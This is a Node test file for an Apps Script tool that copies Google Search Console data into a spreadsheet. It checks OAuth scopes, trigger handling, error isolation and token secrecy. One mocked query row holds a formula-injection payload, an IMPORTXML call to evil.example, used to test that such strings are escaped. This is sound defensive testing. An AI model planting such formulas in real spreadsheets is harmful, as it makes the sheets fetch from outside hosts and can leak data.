import assert from "node:assert/strict";
import fs from "node:fs";
import vm from "node:vm";
import { test } from "node:test";

const source = fs.readFileSync(new URL("./Code.gs", import.meta.url), "utf8");
const manifest = JSON.parse(fs.readFileSync(new URL("./appsscript.json", import.meta.url), "utf8"));
const names = ["Properties", "Performance", "Sitemaps", "Queries", "Diagnostics"];
const headers = {
  Properties: 4, Performance: 9, Sitemaps: 8, Queries: 9, Diagnostics: 5
};

function setup({ failList = false, failPerformance = "" } = {}) {
  const tabs = new Map(names.map(name => {
    const data = [];
    const tab = {
      data, name,
      getName() { return name; },
      getLastColumn() { return headers[name]; },
      getMaxRows() { return 1200; },
      insertRowsAfter() {},
      getRange(row, col, rowCount, columnCount) {
        return {
          clearContent() { for (let i = row - 2; i < data.length; i++) if (i >= 0) data[i] = []; },
          setValues(rows) { rows.forEach((v, i) => { data[row - 2 + i] = v; }); }
        };
      }
    };
    return [name, tab];
  }));
  const triggers = [];
  const requestLog = [];
  const workbook = { getSheetByName: name => tabs.get(name) };
  const responder = (body, code = 200) => ({
    getResponseCode: () => code,
    getContentText: () => JSON.stringify(body)
  });
  const mock = {
    SpreadsheetApp: { getActiveSpreadsheet: () => null, openById(id) { assert.equal(id, "private-existing-bridge-sheet-id"); return workbook; }, flush() {} },
    ScriptApp: {
      getOAuthToken: () => "secret-access-token",
      getProjectTriggers: () => triggers,
      deleteTrigger: trigger => triggers.splice(triggers.indexOf(trigger), 1),
      newTrigger: handler => ({
        timeBased() { return this; },
        everyDays(days) { assert.equal(days, 1); return this; },
        atHour(hour) { assert.equal(hour, 7); return this; },
        create() { triggers.push({ getHandlerFunction: () => handler }); return this; }
      })
    },
    Utilities: { formatDate: date => date.toISOString().slice(0, 10) },
    UrlFetchApp: {
      fetch(url, opts) {
        requestLog.push({ url, method: opts.method, headers: opts.headers });
        assert.equal(opts.headers.Authorization, "Bearer secret-access-token");
        assert.ok(url.startsWith("https://www.googleapis.com/webmasters/v3/"));
        if (url.endsWith("/webmasters/v3/sites")) {
          return failList ? responder({ error: { message: "insufficient permission" } }, 403) : responder({
            siteEntry: [
              {siteUrl:"sc-domain:4species.com",permissionLevel:"siteOwner"},
              {siteUrl:"sc-domain:4planet.org",permissionLevel:"siteOwner"},
              {siteUrl:"https://unverified.example.com/",permissionLevel:"siteUnverifiedUser"}
            ]
          });
        }
        if (url.includes("/searchAnalytics/query")) {
          const site = decodeURIComponent(url.split("/sites/")[1].split("/")[0]);
          if (site === failPerformance) return responder({ error: { message: "permission denied" } }, 403);
          const data = JSON.parse(opts.payload);
          if (data.dimensions.length) return responder({ rows:[{keys:['=IMPORTXML("https://evil.example","//")'],clicks:1,impressions:20,ctr:.05,position:12}] });
          return responder({rows:[{clicks:3,impressions:628,ctr:.004777,position:23.63}]});
        }
        if (url.endsWith("/sitemaps")) return responder({sitemap:[{path:"https://4planet.org/sitemap.xml",errors:"0",warnings:"4"}]});
        throw new Error("Unexpected URL " + url);
      }
    },
    PropertiesService: { getScriptProperties() { return { getProperty(key) { assert.equal(key,"GSC4P_SHEET_ID"); return "private-existing-bridge-sheet-id"; } }; } },
    Logger: { log() {} },
    Date, JSON, Error, String, Object, Array, Math
  };
  vm.createContext(mock);
  vm.runInContext(source, mock, { filename: "Code.gs" });
  return { mock, tabs, triggers, requestLog };
}

test("Apps Script manifest requests read-only GSC, not write access", () => {
  assert.ok(manifest.oauthScopes.includes("https://www.googleapis.com/auth/webmasters.readonly"));
  assert.ok(!manifest.oauthScopes.includes("https://www.googleapis.com/auth/webmasters"));
  assert.ok(manifest.oauthScopes.includes("https://www.googleapis.com/auth/spreadsheets"));
  assert.ok(!manifest.oauthScopes.includes("https://www.googleapis.com/auth/drive"));
});

test("one owner auth discovers all sites dynamically and installs one trigger", () => {
  const o = setup();
  const result = o.mock.setup4PlanetGSC();
  assert.equal(result.properties, 3);
  assert.equal(result.readable, 2);
  assert.equal(o.tabs.get("Properties").data.filter(x => x.length).length, 3);
  assert.equal(o.tabs.get("Performance").data.filter(x => x.length).length, 2);
  assert.equal(o.tabs.get("Sitemaps").data.filter(x => x.length).length, 2);
  assert.equal(o.tabs.get("Queries").data.filter(x => x.length).length, 2);
  assert.equal(o.triggers.length, 1);
  o.mock.setup4PlanetGSC();
  assert.equal(o.triggers.length, 1, "rerun must not duplicate triggers");
  assert.ok(!JSON.stringify([...o.tabs.values()].map(x => x.data)).includes("secret-access-token"));
  assert.ok(!o.requestLog.some(x => x.method !== "get" && x.method !== "post"));
});

test("query strings from Google cannot become executable formulas", () => {
  const o=setup();o.mock.sync4PlanetGSC();
  assert.equal(o.tabs.get("Queries").data[0][1].startsWith("'="),true);
});

test("failed property listing does not erase previous Sheets snapshot or create trigger", () => {
  const o=setup({failList:true});
  o.tabs.get("Properties").data.push(["existing-property","siteOwner","yesterday","OK"]);
  assert.throws(() => o.mock.setup4PlanetGSC(),/GSC HTTP 403/);
  assert.equal(o.tabs.get("Properties").data[0][0],"existing-property");
  assert.equal(o.triggers.length,0);
});

test("one property failing does not break other properties or export OAuth token", () => {
  const o=setup({failPerformance:"sc-domain:4planet.org"});
  const report=o.mock.sync4PlanetGSC();
  assert.equal(report.properties,3);
  assert.ok(o.tabs.get("Performance").data.some(r=>r[0]==="sc-domain:4planet.org"&&r[7]==="ERROR"));
  assert.ok(o.tabs.get("Performance").data.some(r=>r[0]==="sc-domain:4species.com"&&r[7]==="OK"));
  assert.ok(o.tabs.get("Diagnostics").data.some(r=>r[1]==="sc-domain:4planet.org"&&r[3]==="ERROR"));
  assert.ok(!JSON.stringify([...o.tabs.values()].map(x=>x.data)).includes("secret-access-token"));
});
